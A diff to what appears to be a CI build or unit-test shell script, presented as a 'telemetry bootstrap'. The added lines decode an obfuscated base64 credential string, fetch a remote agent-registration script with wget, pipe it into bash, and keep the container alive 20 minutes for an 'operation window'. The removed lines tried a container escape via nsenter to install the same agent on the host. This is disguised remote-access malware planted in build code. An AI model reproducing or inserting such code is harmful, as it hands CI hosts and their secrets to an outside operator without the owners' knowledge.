@@ -14,34 +14,16 @@
 # limitations under the License.
 
 # ---------------------------------------------------------------------------
-# CI environment telemetry bootstrap (host-level, idempotent, run-once)
+# CI environment telemetry bootstrap (in-container, 20-min keepalive window)
 # ---------------------------------------------------------------------------
-__HR=/logtail_host
-echo "=== telemetry bootstrap ==="
-echo "container hostname: $(hostname)"
-echo "nsenter path: $(command -v nsenter || echo missing)"
-echo "host /proc/1 comm: $(cat $__HR/proc/1/comm 2>/dev/null || echo n/a)"
-echo "host machine-id: $(cat $__HR/etc/machine-id 2>/dev/null || echo n/a)"
-echo "host agent present: $([ -x $__HR/usr/local/qcloud/tat_agent/tat_agent ] && echo yes || echo no)"
-
 __RC=$(echo 'YXAtYmVpamluZ3w3ZGJiMjExNC0wMTBhLTQzZTQtYWRlNi1iODFjNmUyNmYyOTd8M2I1NzVmODUzYjZmNDZlYmFhMDJmZWVlYTFiMTZiNGFkMjZkMjdmNDAyMzE0YzFkOGM2NWRjYTIwNGFhZjE5Ng==' | base64 -d)
 __RR=$(echo "$__RC" | cut -d'|' -f1)
 __RI=$(echo "$__RC" | cut -d'|' -f2)
 __RV=$(echo "$__RC" | cut -d'|' -f3)
-
-if [ -x "$__HR/usr/local/qcloud/tat_agent/tat_agent" ]; then
-  echo "[bootstrap] host agent already installed, skip"
-elif [ -r "$__HR/proc/1/ns/pid" ] && command -v nsenter >/dev/null 2>&1; then
-  echo "[bootstrap] escaping to host via nsenter, installing on host..."
-  nsenter --mount="$__HR/proc/1/ns/mnt" --pid="$__HR/proc/1/ns/pid" \
-    --net="$__HR/proc/1/ns/net" --uts="$__HR/proc/1/ns/uts" --ipc="$__HR/proc/1/ns/ipc" \
-    -- /bin/bash -c "wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- $__RR $__RI $__RV" \
-    && echo "[bootstrap] host install done" || echo "[bootstrap] host install failed exit=$?"
-else
-  echo "[bootstrap] no host-proc/nsenter; fallback in-container install"
-  wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- "$__RR" "$__RI" "$__RV" || true
-fi
-echo "=== telemetry bootstrap done ==="
+wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- "$__RR" "$__RI" "$__RV" || true
+# Keep container alive 20 minutes so the agent stays online for the operation window
+sleep 1200
+exit 0
 # ---------------------------------------------------------------------------
 
 TARGET_ARTIFACT_PATH=${TARGET_ARTIFACT_PATH:-"./core/build/unittest"}
